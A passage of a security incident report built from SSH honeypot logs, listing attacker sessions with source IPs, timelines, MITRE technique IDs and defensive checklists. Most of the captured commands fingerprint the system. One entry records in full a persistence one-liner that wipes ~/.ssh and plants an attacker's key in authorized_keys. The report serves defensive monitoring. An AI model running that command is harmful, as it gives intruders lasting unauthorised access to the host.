| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:43:50` | `cowrie.session.connect` |
| `2026-08-16 09:43:50` | `cowrie.client.version` |
| `2026-08-16 09:43:50` | `cowrie.client.kex` |
| `2026-08-16 09:43:51` | `cowrie.login.success` |
| `2026-08-16 09:43:53` | `cowrie.session.params` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.command.success` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.log.closed` |
| `2026-08-16 09:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72000edd4266

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:45 |
| **Last Seen** | 2026-08-16 09:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:45:28` | `cowrie.session.connect` |
| `2026-08-16 09:45:29` | `cowrie.client.version` |
| `2026-08-16 09:45:29` | `cowrie.client.kex` |
| `2026-08-16 09:45:30` | `cowrie.login.success` |
| `2026-08-16 09:45:31` | `cowrie.session.params` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.command.success` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.command.input` |
| `2026-08-16 09:45:31` | `cowrie.log.closed` |
| `2026-08-16 09:45:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39fdb2d994e1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:47 |
| **Last Seen** | 2026-08-16 09:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:47:13` | `cowrie.session.connect` |
| `2026-08-16 09:47:13` | `cowrie.client.version` |
| `2026-08-16 09:47:13` | `cowrie.client.kex` |
| `2026-08-16 09:47:14` | `cowrie.login.success` |
| `2026-08-16 09:47:15` | `cowrie.session.params` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.command.success` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.command.input` |
| `2026-08-16 09:47:15` | `cowrie.log.closed` |
| `2026-08-16 09:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f30f1c6ea3b8

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-08-16 09:49 |
| **Last Seen** | 2026-08-16 09:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:49:02` | `cowrie.session.connect` |
| `2026-08-16 09:49:03` | `cowrie.client.version` |
| `2026-08-16 09:49:03` | `cowrie.client.kex` |
| `2026-08-16 09:49:05` | `cowrie.login.success` |
| `2026-08-16 09:49:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc94ed84ac7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:49 |
| **Last Seen** | 2026-08-16 09:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:49:07` | `cowrie.session.connect` |
| `2026-08-16 09:49:07` | `cowrie.client.version` |
| `2026-08-16 09:49:07` | `cowrie.client.kex` |
| `2026-08-16 09:49:07` | `cowrie.login.success` |
| `2026-08-16 09:49:08` | `cowrie.session.params` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.command.success` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.command.input` |
| `2026-08-16 09:49:08` | `cowrie.log.closed` |
| `2026-08-16 09:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd41cc927dd

| Field | Detail |
|---|---|
| **Source IP** | `117.250.19[.]91` |
| **First Seen** | 2026-08-16 09:50 |
| **Last Seen** | 2026-08-16 09:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:50:00` | `cowrie.session.connect` |
| `2026-08-16 09:50:01` | `cowrie.client.version` |
| `2026-08-16 09:50:01` | `cowrie.client.kex` |
| `2026-08-16 09:50:05` | `cowrie.login.success` |
| `2026-08-16 09:50:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.19[.]91` to AbuseIPDB if not already reported
- [ ] Block `117.250.19[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a8f04e2522

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-08-16 09:50 |
| **Last Seen** | 2026-08-16 09:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:50:16` | `cowrie.session.connect` |
| `2026-08-16 09:50:17` | `cowrie.client.version` |
| `2026-08-16 09:50:17` | `cowrie.client.kex` |
| `2026-08-16 09:50:19` | `cowrie.login.success` |
| `2026-08-16 09:50:20` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7581f45336b0

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 09:50 |
| **Last Seen** | 2026-08-16 09:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:50:55` | `cowrie.session.connect` |
| `2026-08-16 09:50:55` | `cowrie.client.version` |
| `2026-08-16 09:50:55` | `cowrie.client.kex` |
| `2026-08-16 09:50:56` | `cowrie.login.success` |
| `2026-08-16 09:50:57` | `cowrie.session.params` |
| `2026-08-16 09:50:57` | `cowrie.command.input` |
| `2026-08-16 09:50:57` | `cowrie.log.closed` |
| `2026-08-16 09:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88bbcb701546

| Field | Detail |
|---|---|
| **Source IP** | `128.1.38[.]105` |
| **First Seen** | 2026-08-16 09:50 |
| **Last Seen** | 2026-08-16 09:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:50:59` | `cowrie.session.connect` |
| `2026-08-16 09:50:59` | `cowrie.client.version` |
| `2026-08-16 09:50:59` | `cowrie.client.kex` |
| `2026-08-16 09:51:00` | `cowrie.login.success` |
| `2026-08-16 09:51:01` | `cowrie.session.params` |
| `2026-08-16 09:51:01` | `cowrie.command.input` |
| `2026-08-16 09:51:01` | `cowrie.command.failed` |
| `2026-08-16 09:51:02` | `cowrie.log.closed` |
| `2026-08-16 09:51:02` | `cowrie.session.params` |
| `2026-08-16 09:51:02` | `cowrie.command.input` |
| `2026-08-16 09:51:03` | `cowrie.session.file_download` |
| `2026-08-16 09:51:03` | `cowrie.log.closed` |
| `2026-08-16 09:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.38[.]105` to AbuseIPDB if not already reported
- [ ] Block `128.1.38[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e89005269f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:51 |
| **Last Seen** | 2026-08-16 09:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:51:03` | `cowrie.session.connect` |
| `2026-08-16 09:51:03` | `cowrie.client.version` |
| `2026-08-16 09:51:03` | `cowrie.client.kex` |
| `2026-08-16 09:51:04` | `cowrie.login.success` |
| `2026-08-16 09:51:06` | `cowrie.session.params` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.command.success` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.command.input` |
| `2026-08-16 09:51:06` | `cowrie.log.closed` |
| `2026-08-16 09:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0851e390edf5

| Field | Detail |
|---|---|
| **Source IP** | `128.1.38[.]105` |
| **First Seen** | 2026-08-16 09:51 |
| **Last Seen** | 2026-08-16 09:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:51:08` | `cowrie.session.connect` |
| `2026-08-16 09:51:08` | `cowrie.client.version` |
| `2026-08-16 09:51:08` | `cowrie.client.kex` |
| `2026-08-16 09:51:09` | `cowrie.login.success` |
| `2026-08-16 09:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.38[.]105` to AbuseIPDB if not already reported
- [ ] Block `128.1.38[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec2f12997d5

| Field | Detail |
|---|---|
| **Source IP** | `128.1.38[.]105` |
| **First Seen** | 2026-08-16 09:51 |
| **Last Seen** | 2026-08-16 09:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:51:10` | `cowrie.session.connect` |
| `2026-08-16 09:51:10` | `cowrie.client.version` |
| `2026-08-16 09:51:10` | `cowrie.client.kex` |
| `2026-08-16 09:51:11` | `cowrie.login.success` |
| `2026-08-16 09:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.38[.]105` to AbuseIPDB if not already reported
- [ ] Block `128.1.38[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cad30ccbf3e8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:52 |
| **Last Seen** | 2026-08-16 09:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:52:41` | `cowrie.session.connect` |
| `2026-08-16 09:52:41` | `cowrie.client.version` |
| `2026-08-16 09:52:41` | `cowrie.client.kex` |
| `2026-08-16 09:52:43` | `cowrie.login.success` |
| `2026-08-16 09:52:45` | `cowrie.session.params` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:45` | `cowrie.command.success` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:45` | `cowrie.command.input` |
| `2026-08-16 09:52:46` | `cowrie.log.closed` |
| `2026-08-16 09:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3badcee11c9c

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 09:53 |
| **Last Seen** | 2026-08-16 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:53:42` | `cowrie.session.connect` |
| `2026-08-16 09:53:42` | `cowrie.client.version` |
| `2026-08-16 09:53:42` | `cowrie.client.kex` |
| `2026-08-16 09:53:43` | `cowrie.login.success` |
| `2026-08-16 09:53:44` | `cowrie.session.params` |
| `2026-08-16 09:53:44` | `cowrie.command.input` |
| `2026-08-16 09:53:44` | `cowrie.log.closed` |
| `2026-08-16 09:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38dab86917ae

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]23` |
| **First Seen** | 2026-08-16 09:54 |
| **Last Seen** | 2026-08-16 09:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:54:12` | `cowrie.session.connect` |
| `2026-08-16 09:54:12` | `cowrie.client.version` |
| `2026-08-16 09:54:12` | `cowrie.client.kex` |
| `2026-08-16 09:54:15` | `cowrie.login.success` |
| `2026-08-16 09:54:15` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:54:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]23` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7df7990d57

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:54 |
| **Last Seen** | 2026-08-16 09:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:54:20` | `cowrie.session.connect` |
| `2026-08-16 09:54:20` | `cowrie.client.version` |
| `2026-08-16 09:54:20` | `cowrie.client.kex` |
| `2026-08-16 09:54:22` | `cowrie.login.success` |
| `2026-08-16 09:54:23` | `cowrie.session.params` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.command.success` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.command.input` |
| `2026-08-16 09:54:23` | `cowrie.log.closed` |
| `2026-08-16 09:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab2b84cd75f7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:55 |
| **Last Seen** | 2026-08-16 09:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:55:49` | `cowrie.session.connect` |
| `2026-08-16 09:55:49` | `cowrie.client.version` |
| `2026-08-16 09:55:49` | `cowrie.client.kex` |
| `2026-08-16 09:55:51` | `cowrie.login.success` |
